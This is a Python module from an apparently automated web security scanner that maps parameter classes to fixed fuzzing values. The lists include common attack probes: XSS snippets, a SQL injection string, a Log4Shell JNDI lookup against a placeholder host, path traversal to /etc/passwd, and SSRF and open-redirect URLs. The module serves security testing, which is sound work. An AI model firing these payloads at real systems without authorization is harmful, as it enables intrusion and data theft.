"""Class-spray library: deterministic fixed value sets per parameter class."""

from __future__ import annotations

from typing import TYPE_CHECKING


if TYPE_CHECKING:
    from strix.core.inventory.models import Param, ParamClassName


_CLASS_SPRAY_VALUES: dict[ParamClassName, list[str]] = {
    "object-id": [
        "1",
        "2",
        "123",
        "999999",
        "00000000-0000-0000-0000-000000000001",
        "self",
        "0",
    ],
    "url": [
        "https://example.com/callback",
        "http://127.0.0.1/admin",
        "https://evil.example.com",
        "file:///etc/passwd",
        "javascript://alert(1)",
    ],
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "plain text",
        "' OR '1'='1",
        "${jndi:ldap://evil/a}",
    ],
    "file": [
        "exploit.php",
        "shell.asp",
        "../../../etc/passwd",
        "file.svg",
        "malicious.exe",
    ],
    "amount": [
        "-1",
        "0",
        "1",
        "999999999",
        "1.5",
        "1e308",
    ],
    "role": [
        "admin",
        "user",
        "guest",
        "superuser",
        "moderator",
    ],
    "state": [
        "true",
        "false",
        "1",
        "0",
        "enabled",
        "disabled",
    ],
    "unknown": [
        "test",
        "",
        "null",
        "undefined",
        "💥",
    ],
}


def spray_values_for(class_name: ParamClassName) -> list[str]:
    """Return the deterministic fixed spray set for a class."""
    return list(_CLASS_SPRAY_VALUES.get(class_name, _CLASS_SPRAY_VALUES["unknown"]))


def spray_values_for_param(param: Param) -> list[str]:
    """Return spray values for a parameter based on its class evidence."""
    if param.class_evidence is not None and param.class_evidence.class_name:
        return spray_values_for(param.class_evidence.class_name)
    return spray_values_for("unknown")


def all_classes() -> list[ParamClassName]:
    """Return all supported spray classes."""
    return list(_CLASS_SPRAY_VALUES)
